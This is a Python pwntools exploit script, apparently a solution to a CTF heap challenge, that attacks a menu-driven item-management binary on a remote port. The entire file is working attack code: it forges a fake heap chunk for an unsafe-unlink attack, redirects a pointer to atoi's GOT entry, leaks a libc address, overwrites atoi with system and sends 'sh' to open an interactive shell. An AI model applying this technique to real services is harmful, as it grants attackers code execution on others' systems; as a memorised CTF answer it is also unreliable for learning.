from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10138
r = remote(host, port)

input('Enter')

def show_item():
    r.recvuntil(':')
    r.sendline(b'1')

def add_item(size, name):
    r.recvuntil(':')
    r.sendline(b'2')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(name)

def change(idx, size, name):
    r.recvuntil(':')
    r.sendline(b'3')
    r.recvuntil(':')
    r.sendline(str(idx).encode())
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    r.sendline(name)

def remove_item(idx):
    r.recvuntil(':')
    r.sendline(b'4')
    r.recvuntil(':')
    r.sendline(str(idx).encode())

add_item(0x80, b'a')    # 0
add_item(0x80, b'a')    # 1
add_item(0x80, b'a')    # 2

chunk = p64(0) + p64(0x81)  # prev_size, size
chunk += p64(0x6020d8-0x18) + p64(0x6020d8-0x10)  # fd, bk
chunk += b'a'*0x60
chunk += p64(0x80) + p64(0x90)  # prev_size, size
print(len(chunk))
# input('Input chunk.')
change(1, 0x100, chunk)         # prev_size, size
remove_item(2)

atoi_got = 0x602068
atoi_off = 0x36e80
change(1, 0x100, p64(0) + p64(atoi_got))
show_item()
r.recvuntil('0 : ')
libc = u64(r.recvuntil('1 : ')[:-4].ljust(8, b'\x00')) - atoi_off
system = libc + 0x45390
change(0, 0x100, p64(system))

r.recvuntil(':')
r.sendline(b'sh')

r.interactive()
